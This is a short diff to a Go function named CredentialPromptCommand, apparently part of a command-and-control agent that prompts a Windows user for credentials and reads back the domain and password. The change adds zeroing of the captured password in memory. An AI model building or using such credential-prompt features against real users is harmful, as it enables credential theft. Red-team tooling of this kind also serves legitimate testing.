@@ -149,10 +149,11 @@ func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResu
 	domain := syscall.UTF16ToString(domainBuf[:domainLen])
 	password := syscall.UTF16ToString(passBuf[:passLen])
 
-	// Zero out the password buffer
+	// Zero out the password buffer and schedule Go string zeroing
 	for i := range passBuf {
 		passBuf[i] = 0
 	}
+	defer structs.ZeroString(&password)
 
 	if password == "" {
 		return structs.CommandResult{
